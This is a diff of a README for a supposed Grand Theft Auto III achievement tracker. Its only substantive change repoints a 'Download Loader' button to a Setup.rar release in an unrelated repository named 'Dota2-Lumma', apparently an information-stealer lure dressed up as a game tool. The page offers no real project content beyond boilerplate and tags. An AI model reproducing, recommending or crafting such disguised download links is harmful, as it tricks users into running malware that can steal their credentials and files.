@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Grand Theft Auto III Achievement Tracker
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `Grand-Theft-Auto-III-Achievement-Tracker` · Updated: 2026-10-30
 
 **Tags:** `grand-theft-auto-iii` `achievement-tracker` `pc-gaming` `gameplay` `progress-tracking` `windows` `steam`
+
 
